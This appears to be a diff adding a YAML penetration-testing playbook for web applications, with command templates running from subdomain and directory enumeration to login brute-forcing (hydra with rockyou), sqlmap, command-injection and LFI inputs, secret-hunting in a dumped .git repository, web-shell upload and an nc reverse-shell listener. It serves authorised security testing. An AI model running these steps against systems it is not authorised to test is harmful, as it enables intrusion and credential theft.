@@ -1,0 +1,115 @@
+name: web-app
+display_name: "Web Application"
+description: "Web application pentest methodology — from recon to shell"
+
+applicable_when:
+  ports: [80, 443, 8080, 8443]
+  services: ["http", "https"]
+
+steps:
+  - id: tech-fingerprint
+    name: "Technology Fingerprinting"
+    phase: recon
+    description: "Identify web stack, frameworks, and versions"
+    commands:
+      - "whatweb http://{IP}"
+      - "curl -sI http://{IP}"
+      - "wappalyzer or browser dev tools"
+
+  - id: subdomain-enum
+    name: "Subdomain Enumeration"
+    phase: recon
+    description: "Enumerate subdomains using active (brute-force) and passive (OSINT) methods"
+    commands:
+      - "subfinder -d {DOMAIN} -o subdomains_passive.txt # Passive: Collect from 30+ sources"
+      - "assetfinder --subs-only {DOMAIN} >> subdomains_passive.txt # Passive: Crawling/Certs"
+      - "amass enum -passive -d {DOMAIN} -o amass.txt # Passive: OSINT"
+      - "cat subdomains_passive.txt amass.txt | sort -u > subdomains.txt"
+      - "gobuster dns -d {DOMAIN} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o subdomains_active.txt # Active: DNS Brute"
+      - "ffuf -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.{DOMAIN} -mc 200,301,302,403 # Active: VHost Discovery"
+      - "cat subdomains*.txt | sort -u > all_subdomains.txt"
+      - "httpx -l all_subdomains.txt -title -tech-detect -status-code # Validation: Check which actully respond"
+
+  - id: dir-fuzz
+    name: "Directory & File Fuzzing"
+    phase: recon
+    description: "Discover hidden paths and files"
+    commands:
+      - "capo web fuzz"
+      - "capo web fuzz --ext php,asp,aspx,jsp,txt,bak"
+      - "feroxbuster -u http://{IP} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 2"
+    check:
+      directories_min: 1
+
+  - id: vhost-enum
+    name: "Virtual Host Enumeration"
+    phase: recon
+    description: "Find additional hostnames and vhosts"
+    commands:
+      - "capo web vhost"
+      - "ffuf -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -w subdomains.txt -fc 302"
+
+  - id: git-exposure
+    name: "Git Repository Exposure"
+    phase: enumeration
+    description: "Dump and triage an exposed .git directory for source code and credentials"
+    commands:
+      - "curl -s http://{IP}/.git/HEAD  # Confirm exposure (expect: 'ref: refs/heads/...')"
+      - "curl -s http://{IP}/.git/config  # Grab remote URL and branch info"
+      - "git-dumper http://{IP}/.git/ ./git-dump  # Reconstruct full repo (pip install git-dumper)"
+      - "git -C ./git-dump log --oneline --all  # Review full commit history"
+      - "grep -rE 'password|secret|api.?key|token' ./git-dump -l  # Hunt for secrets in source"
+      - "trufflehog filesystem ./git-dump  # Automated secret scanning"
+      - "git -C ./git-dump stash show -p  # Check stashed work-in-progress changes"
+    check:
+      directories_containing: [".git"]
+
+  - id: cms-scan
+    name: "CMS / Framework Specific Scans"
+    phase: enumeration
+    description: "Run targeted scans for detected CMS platforms"
+    commands:
+      - "wpscan --url http://{IP} -e ap,at,u"
+      - "droopescan scan drupal -u http://{IP}"
+      - "joomscan --url http://{IP}"
+
+  - id: param-fuzz
+    name: "Parameter & Input Fuzzing"
+    phase: enumeration
+    description: "Discover hidden parameters and test input handling"
+    commands:
+      - "arjun -u http://{IP}/endpoint"
+      - "ffuf -u 'http://{IP}/page?FUZZ=test' -w params.txt -fc 302"
+
+  - id: auth-test
+    name: "Authentication Testing"
+    phase: credential-access
+    description: "Test for default creds, brute-force, registration flaws"
+    commands:
+      - "hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'"
+      - "Check for password reset, registration, and session flaws"
+
+  - id: injection
+    name: "Injection Testing"
+    phase: exploitation
+    description: "Test for SQL injection, command injection, SSTI, etc."
+    commands:
+      - "sqlmap -u 'http://{IP}/page?id=1' --batch --dbs"
+      - "Test for SSTI: {{7*7}}, ${7*7}, #{7*7}"
+      - "Test for command injection: ; id, | id, $(id)"
+
+  - id: file-ops
+    name: "File Upload / Include"
+    phase: exploitation
+    description: "Test file upload and local/remote file inclusion"
+    commands:
+      - "Test LFI: http://{IP}/page?file=../../../../etc/passwd"
+      - "Upload web shell via file upload functionality"
+
+  - id: shell
+    name: "Get a Shell"
+    phase: exploitation
+    description: "Obtain remote code execution"
+    commands:
+      - "nc -lvnp 4444"
+      - "Trigger reverse shell via discovered vector"
